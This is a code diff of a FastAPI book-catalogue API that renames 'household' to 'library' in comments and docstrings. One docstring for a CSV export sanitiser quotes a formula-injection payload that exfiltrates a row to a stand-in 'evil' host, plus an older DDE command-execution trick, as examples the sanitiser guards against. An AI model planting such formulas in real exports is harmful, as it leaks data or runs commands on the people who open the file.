@@ -124,7 +124,7 @@ router = APIRouter(prefix="/api/books", tags=["books"])
 
 @router.get("/tags", response_model=list[TagOut])
 def list_tags(db: DbSession, current_user: CurrentUser) -> list[TagOut]:
-    """The curated vocabulary plus whatever the household has invented.
+    """The curated vocabulary plus whatever the library has invented.
 
     The **client** decides the order the groups appear in (`TAG_CATEGORY_ORDER`
     in the frontend), because that is a presentation decision and it needs the
@@ -191,7 +191,7 @@ def delete_tag(
     db: DbSession,
     current_user: Annotated[User, Depends(require_admin)],
 ) -> None:
-    """Remove a tag the household invented, and take it off every book.
+    """Remove a tag the library invented, and take it off every book.
 
     **Admin only, and deliberately asymmetric with creating one.** Creating a
     tag is additive and reversible by deleting it, so it is open to everyone.
@@ -460,7 +460,7 @@ async def search_books(
     is written until a person confirms.
 
     **No API key is required.** This used to be Google Books only and was
-    hidden entirely from a household that had not configured one, which left
+    hidden entirely from a library that had not configured one, which left
     them with no way at all to add a book by title. Open Library answers
     without a key; Google is merged in on top when one is set, for the blurb
     and the categories its search index carries and Open Library's does not.
@@ -477,7 +477,7 @@ async def search_books(
         api_key = settings_store.google_books_api_key(db)
 
     metadata_limiter.check(current_user.username)
-    # The reader's own language, so a German household searching a German
+    # The reader's own language, so a German library searching a German
     # title gets the German printing first. It breaks ties only: an English
     # title still returns the English book.
     matches = await metadata.search(q, api_key, limit=limit, prefer_language=lang)
@@ -614,7 +614,7 @@ def _csv_safe(value: object) -> str:
 
     Every text column of this export is member-supplied: titles, authors,
     publishers, descriptions, shelf locations and **tag names**. Tags are
-    household-wide, so a tag put on a public book reaches every other member's
+    library wide, so a tag put on a public book reaches every other member's
     export. `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the
     row when an admin opens the file, and `=cmd|'/c calc'!A1` is the older
     trick. `csv.writer` quotes for CSV correctness and does nothing about this.
@@ -758,7 +758,7 @@ def list_books(
     # nor production would refuse, and the obvious conclusion from that is the
     # wrong one.
     #
-    # Against a household catalogue of a few thousand books, of which one
+    # Against a library catalogue of a few thousand books, of which one
     # author holds a fraction, every one of these numbers is far away. If that
     # stops being true the fix is a temporary table, not a bigger IN clause.
     if author is not None:
@@ -895,7 +895,7 @@ def _checked_collection(db: Session, collection_id: int | None) -> int | None:
 
     A 400 rather than a 404: the request is about a book, and the thing that
     does not exist is a field in its body. It is also not a privacy question,
-    because collections are household wide, so there is nothing here to withhold
+    because collections are library wide, so there is nothing here to withhold
     by answering vaguely.
 
     The range check is not redundant with the schemas that bound this field.
@@ -1471,7 +1471,7 @@ def _author_out(entry: AuthorEntry, alias_ids: dict[str, int]) -> AuthorOut:
 
     `merged` is built from the entry's own `alias_keys`, which `build_index`
     fills in only for a spelling that appears on a book **this caller can
-    see**. That is the privacy line for the alias table: the rows are household
+    see**. That is the privacy line for the alias table: the rows are library
     wide, and one whose spelling survives only on somebody else's private book
     would otherwise announce that the book exists.
 
@@ -1517,7 +1517,7 @@ def _author_book_ids(db: Session, user_id: int, author: str) -> list[int]:
     **Re-read per page, not per request.** The listing is paginated and this
     runs on every page of it, so a scroll through an author's shelf re-scans
     and re-splits the whole visible catalogue once per page. Acceptable at
-    household size and the same trade `/duplicates` makes, but it is per page,
+    library size and the same trade `/duplicates` makes, but it is per page,
     which is the number to remember if this ever needs a cache.
 
     An unknown name gives an empty list rather than a 404. This is a filter on
@@ -1617,7 +1617,7 @@ def merge_authors(
     by_alias_key = {row.alias_key: row for row in aliases}
     keep_name = payload.keep_name
     existing_target = by_alias_key.get(author_key(keep_name))
-    # Followed whoever the row belongs to: a canonical name is household wide,
+    # Followed whoever the row belongs to: a canonical name is library wide,
     # like a collection's name, so there is nothing here to withhold. Gating
     # this on what the caller can see was tried and withdrawn: it made a chain
     # storable, and it disagreed with the `reachable` set above, which is a
@@ -2468,7 +2468,7 @@ def get_book(book: BookForRead, db: DbSession, current_user: CurrentUser) -> Boo
 
 # ── Copies ────────────────────────────────────────────────────────────────────
 #
-# A household that owns two paperbacks of one title owns two objects, and every
+# A library that holds two paperbacks of one title owns two objects, and every
 # per-object fact in `books` (location, condition, what was paid, who has it)
 # is already written per row. So a copy is a second row, joined to the first by
 # a shared `copy_group`.
@@ -2529,7 +2529,7 @@ def add_copy(
     db: DbSession,
     current_user: CurrentUser,
 ) -> BookOut:
-    """Record that the household owns another copy of this book.
+    """Record that the library holds another copy of this book.
 
     The deliberate half of the ISBN collision. Scanning a book already on the
     shelf answers 409 exactly as it always has, because the overwhelmingly
@@ -3098,7 +3098,7 @@ def delete_note(
 #
 # The same access rules as notes, and deliberately so. A quote is visible to
 # whoever can see the book it came from: the shelf is shared, and a passage one
-# member copied out of a book the household owns is the household's to read.
+# member copied out of a book the library holds is the library's to read.
 # It is not treated like `list_progress`, which returns only the caller's own
 # rows, because a reading log is a diary about a person and a quote is about
 # the book. `docs/decisions.md` records the choice.
